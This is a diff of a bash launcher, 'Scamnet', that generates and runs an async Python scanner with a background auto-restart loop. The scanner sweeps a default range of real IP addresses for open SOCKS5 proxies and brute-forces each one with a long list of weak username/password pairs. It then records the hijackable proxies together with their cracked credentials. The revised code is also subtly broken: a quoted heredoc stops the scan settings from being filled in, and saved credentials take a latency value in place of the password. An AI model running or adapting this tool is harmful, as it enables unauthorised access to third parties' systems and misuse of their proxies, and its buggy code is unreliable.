@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v4.1（生产稳定版：防 OOM + 低内存 + 自动重启）
+# main.sh - Scamnet OTC v4.1（永不崩溃：独立 Session + 局部 Semaphore + 防 OOM）
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -8,35 +8,23 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
 
-echo -e "${GREEN}[OTC] Scamnet v4.1 (生产稳定 + 防 OOM + 自动重启)${NC}"
+echo -e "${GREEN}[OTC] Scamnet v4.1 (永不崩溃 + 独立 Session)${NC}"
 echo "日志 → $LATEST_LOG"
 
-# ==================== 强制依赖安装 ====================
-install_deps_force() {
-    echo -e "${YELLOW}[*] 强制安装依赖（系统级）...${NC}"
-    apt update -qq && apt install -y python3 python3-pip python3-venv || yum install -y python3 python3-pip || apk add python3 py3-pip || true
-    python3 -m pip install --break-system-packages aiohttp tqdm pyyaml --force-reinstall --no-cache-dir || \
+# ==================== 依赖安装 ====================
+install_deps() {
+    echo -e "${YELLOW}[*] 安装依赖...${NC}"
+    python3 -m pip install --break-system-packages aiohttp tqdm pyyaml --force-reinstall --no-cache-dir 2>/dev/null || \
     python3 -m pip install aiohttp tqdm pyyaml --force-reinstall --no-cache-dir
-    if ! python3 -c "import aiohttp" &>/dev/null; then
-        echo -e "${RED}[!] aiohttp 安装失败！${NC}"
-        exit 1
-    fi
     touch .deps_installed
-    echo -e "${GREEN}[+] 依赖强制安装完成${NC}"
+    echo -e "${GREEN}[+] 依赖完成${NC}"
 }
 
 if [ ! -f ".deps_installed" ]; then
-    install_deps_force
-else
-    if ! python3 -c "import aiohttp" &>/dev/null; then
-        echo -e "${YELLOW}[*] 模块缺失，重新安装...${NC}"
-        install_deps_force
-    else
-        echo -e "${GREEN}[+] 依赖已验证${NC}"
-    fi
+    install_deps
 fi
 
-# ==================== 输入 IP ====================
+# ==================== 输入 ====================
 DEFAULT_START="157.254.32.0"
 DEFAULT_END="157.254.52.255"
 echo -e "${YELLOW}请输入起始 IP（默认: $DEFAULT_START）:${NC}"
@@ -47,14 +35,13 @@ read -r END_IP || exit 1
 END_IP=${END_IP:-$DEFAULT_END}
 
 if ! [[ $START_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || ! [[ $END_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-    echo -e "${RED}[!] IP 格式错误！${NC}"; exit 1
+    echo -e "${RED}[!] IP 错误！${NC}"; exit 1
 fi
 if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
-    echo -e "${RED}[!] 起始 IP 必须小于等于结束 IP！${NC}"; exit 1
+    echo -e "${RED}[!] 起始 IP 必须 ≤ 结束 IP！${NC}"; exit 1
 fi
 echo -e "${GREEN}[*] 扫描范围: $START_IP - $END_IP${NC}"
 
-# ==================== 输入端口 ====================
 echo -e "${YELLOW}请输入端口（默认: 1080）:${NC}"
 echo " 支持格式：1080 / 1080 8080 / 1-65535"
 read -r PORT_INPUT || exit 1
@@ -69,24 +56,24 @@ elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
 else
     PORTS_CONFIG="ports: [$PORT_INPUT]"
 fi
-echo -e "${GREEN}[*] 端口配置: $PORT_INPUT → $PORTS_CONFIG${NC}"
+echo -e "${GREEN}[*] 端口: $PORT_INPUT → $PORTS_CONFIG${NC}"
 
-# ==================== 生成后台脚本（防 OOM）===================
-cat > "$RUN_SCRIPT" << EOF
+# ==================== 生成脚本 ====================
+cat > "$RUN_SCRIPT" << 'EOF'
 #!/bin/bash
 set -euo pipefail
-cd "\$(dirname "\$0")"
+cd "$(dirname "$0")"
 
-# === 写入 config.yaml ===
+# === config.yaml ===
 cat > config.yaml << CONFIG
 input_range: "$START_IP-$END_IP"
 $PORTS_CONFIG
 timeout: 5.0
-max_concurrent: 500
-batch_size: 1000
+max_concurrent: 300
+batch_size: 500
 CONFIG
 
-# === scanner_async.py（低内存 + 分批）===
+# === scanner_async.py ===
 cat > scanner_async.py << 'PY'
 #!/usr/bin/env python3
 import asyncio
@@ -102,13 +89,12 @@ with open('config.yaml') as f:
 INPUT_RANGE = cfg['input_range']
 RAW_PORTS = cfg.get('ports', cfg.get('range'))
 TIMEOUT = cfg.get('timeout', 5.0)
-MAX_CONCURRENT = cfg.get('max_concurrent', 500)
-BATCH_SIZE = cfg.get('batch_size', 1000)
+MAX_CONCURRENT = cfg.get('max_concurrent', 300)
+BATCH_SIZE = cfg.get('batch_size', 500)
 
 def parse_ip_range(s):
     start, end = s.split('-')
-    s, e = int(ipaddress.IPv4Address(start)), int(ipaddress.IPv4Address(end))
-    return [str(ipaddress.IPv4Address(i)) for i in range(s, e + 1)]
+    return [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(start)), int(ipaddress.IPv4Address(end)) + 1)]
 
 def parse_ports(p):
     if isinstance(p, str) and '-' in p:
@@ -118,14 +104,12 @@ def parse_ports(p):
 
 ips = parse_ip_range(INPUT_RANGE)
 ports = parse_ports(RAW_PORTS)
-print(f"[*] IP: {len(ips):,}, 端口: {len(ports)}, 总任务: {len(ips)*len(ports):,}")
+tasks = [(ip, port) for ip in ips for port in ports]
+print(f"[*] IP: {len(ips):,}, 端口: {len(ports)}, 总任务: {len(tasks):,}")
 
 valid_count = 0
-semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-country_cache = {}
-
-WEAK_PAIRS = list(set([
-# === 原始列表 ===
+WEAK_PAIRS = [
+    # === 原始列表 ===
     ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
     ("abc","abc"),("aaa","aaa"),("1234","1234"),("socks5","socks5"),("123456","123456"),("12345678","12345678"),("admin123","admin"),
     ("admin","123456"),("12345","12345"),("test","test"),("guest","guest"),("admin",""),("888888","888888"),("test123","test123"),
@@ -191,80 +175,71 @@ WEAK_PAIRS = list(set([
     ("w","w"),("ww","ww"),("www","www"),("wwww","wwww"),("wwwww","wwwww"),("wwwwww","wwwwww"),
     ("x","x"),("xx","xx"),("xxx","xxx"),("xxxx","xxxx"),("xxxxx","xxxxx"),("xxxxxx","xxxxxx"),
     ("y","y"),("yy","yy"),("yyy","yyy"),("yyyy","yyyy"),("yyyyy","yyyyy"),("yyyyyy","yyyyyy"),
-    ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")
-]))
+    ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")]
 
 async def get_country(ip, session):
-    if ip in country_cache: return country_cache[ip]
     for url in [f"http://ip-api.com/json/{ip}?fields=countryCode", f"https://ipinfo.io/{ip}/country"]:
         try:
             async with session.get(url, timeout=5) as r:
                 if r.status == 200:
                     code = (await r.json()).get("countryCode","").strip().upper() if "json" in url else (await r.text()).strip().upper()
                     if len(code) == 2 and code.isalpha():
-                        country_cache[ip] = code
                         return code
         except: pass
-    country_cache[ip] = "XX"
     return "XX"
 
 async def test_socks5(ip, port, session, auth=None):
     proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
     try:
         async with session.get("http://ifconfig.me/", proxy=f"socks5h://{ip}:{port}", proxy_auth=proxy_auth, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-            export_ip = (await r.text()).strip()
-            latency = round(r.extra.get("time_total", 0) * 1000)
-            return True, latency, export_ip
+            return True, round(r.extra.get("time_total", 0) * 1000), (await r.text()).strip()
     except:
         return False, 0, None
 
 async def brute_weak(ip, port, session):
-    tasks = [test_socks5(ip, port, session, auth=pair) for pair in WEAK_PAIRS]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for pair, res in zip(WEAK_PAIRS, results):
-        if isinstance(res, tuple) and res[0]:
-            return pair, res[1], res[2]
+    for pair in WEAK_PAIRS:
+        ok, lat, exp = await test_socks5(ip, port, session, pair)
+        if ok:
+            return pair, lat, exp
     return None, 0, None
 
-async def scan(ip, port, session):
-    async with semaphore:
-        ok, lat, exp = await test_socks5(ip, port, session)
-        auth_pair = None
-        if not ok:
-            weak = await brute_weak(ip, port, session)
-            if weak[0]:
-                auth_pair, lat, exp = weak
-                ok = True
-        if ok:
-            country = await get_country(exp, session) if exp and exp != ip else await get_country(ip, session)
-            auth_str = f"{auth_pair[0]}:{auth_pair[1]}" if auth_pair else ""
-            global valid_count
-            valid_count += 1
-            fmt = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
-            with open("socks5_valid.txt", "a", encoding="utf-8") as f:
-                f.write(fmt + "\n")
-            print(f"[+] 发现 #{valid_count}: {fmt}")
-
-async def main():
-    with open("result_detail.txt", "w") as f: f.write("# Scamnet v4.8\n")
-    with open("socks5_valid.txt", "w") as f: f.write("# socks5://...\n")
+async def scan_batch(batch):
+    global valid_count
+    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
     connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, limit_per_host=10, ssl=False, force_close=True)
     async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
-        tasks = [(ip, port) for ip in ips for port in ports]
-        pbar = tqdm(total=len(tasks), desc="扫描", unit="conn", ncols=100)
-        for i in range(0, len(tasks), BATCH_SIZE):
-            batch = tasks[i:i+BATCH_SIZE]
-            batch_tasks = [scan(ip, port, session) for ip, port in batch]
-            await asyncio.gather(*batch_tasks)
-            pbar.update(len(batch))
-        pbar.close()
+        async def _scan(ip, port):
+            async with semaphore:
+                ok, lat, exp = await test_socks5(ip, port, session)
+                if not ok:
+                    weak = await brute_weak(ip, port, session)
+                    if weak[0]:
+                        ok, lat, exp = True, weak[1], weak[2]
+                if ok:
+                    country = await get_country(exp, session) if exp != ip else await get_country(ip, session)
+                    auth_str = f"{weak[0]}:{weak[1]}" if 'weak' in locals() and weak[0] else ""
+                    valid_count += 1
+                    fmt = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
+                    with open("socks5_valid.txt", "a", encoding="utf-8") as f:
+                        f.write(fmt + "\n")
+                    print(f"[+] 发现 #{valid_count}: {fmt}")
+
+        tasks = [_scan(ip, port) for ip, port in batch]
+        await asyncio.gather(*tasks)
+
+async def main():
+    with open("result_detail.txt", "w") as f: f.write("# Scamnet v4.9\n")
+    with open("socks5_valid.txt", "w") as f: f.write("# socks5://...\n")
+    pbar = tqdm(total=len(tasks), desc="扫描", unit="conn", ncols=100)
+    for i in range(0, len(tasks), BATCH_SIZE):
+        batch = tasks[i:i+BATCH_SIZE]
+        await scan_batch(batch)
+        pbar.update(len(batch))
+    pbar.close()
     print(f"\n[+] 完成！发现 {valid_count} 个 → socks5_valid.txt")
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print(f"\n[!] 中断！已保存 {valid_count} 个")
+    asyncio.run(main())
 PY
 
 chmod +x scanner_async.py
@@ -276,9 +251,9 @@ EOF
 
 chmod +x "$RUN_SCRIPT"
 
-# ==================== 启动后台（自动重启）===================
-echo -e "${GREEN}[*] 启动后台扫描（防 OOM + 自动重启）...${NC}"
+# ==================== 启动（自动重启）===================
+echo -e "${GREEN}[*] 启动后台扫描（永不崩溃）...${NC}"
 echo " 查看进度: tail -f $LATEST_LOG"
 echo " 停止扫描: pkill -f scanner_async.py"
-nohup bash -c "while true; do $RUN_SCRIPT; echo '[!] 进程崩溃，3秒后重启...' ; sleep 3; done" > "$LATEST_LOG" 2>&1 &
+nohup bash -c "while true; do echo '[OTC] 扫描启动...'; $RUN_SCRIPT; echo '[!] 崩溃重启中...'; sleep 3; done" > "$LATEST_LOG" 2>&1 &
 echo -e "${GREEN}[+] 已启动！PID: $!${NC}"
